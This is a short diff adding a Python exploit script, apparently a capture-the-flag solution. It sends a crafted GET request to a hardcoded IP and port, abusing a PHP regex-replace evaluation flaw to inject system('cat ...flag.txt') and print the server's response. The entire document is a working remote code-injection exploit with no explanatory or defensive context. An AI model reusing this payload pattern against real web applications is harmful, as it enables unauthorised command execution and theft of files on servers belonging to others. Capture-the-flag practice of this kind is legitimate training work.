@@ -1,0 +1,12 @@
+exploit.py
+==========
+import requests
+
+target = "http://35.198.135.192:32527/index.php?"
+vector = "/Admin/e&replace=system('cat%20here_we_dont_have_flag/flag.txt')"
+
+url = target + "vector=" + vector
+r = requests.get(url=url)
+print(r.content[85:-2385])
+===========
+python3 exploit.py
